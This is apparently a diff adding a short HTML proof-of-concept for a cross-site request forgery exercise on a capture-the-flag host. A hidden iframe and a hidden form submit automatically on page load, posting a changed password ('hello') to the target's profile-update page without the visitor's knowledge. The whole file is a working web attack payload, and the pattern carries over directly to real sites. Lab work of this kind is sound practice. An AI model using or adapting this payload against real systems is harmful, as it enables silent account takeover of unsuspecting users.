@@ -1,0 +1,11 @@
+<iframe name="stealthFrame" style="display: none"></iframe>
+
+<form method="POST" action="http://ctf.segfaulthub.com:7575/csrf_2/mypage_update.php" target="stealthFrame" id="myForm">
+    <input name="id" type="hidden" />
+    <input name="info" type="hidden" />
+    <input name="pw" type="hidden" value="hello" />
+</form>
+
+<script>
+    document.getElementById('myForm').submit();
+</script>
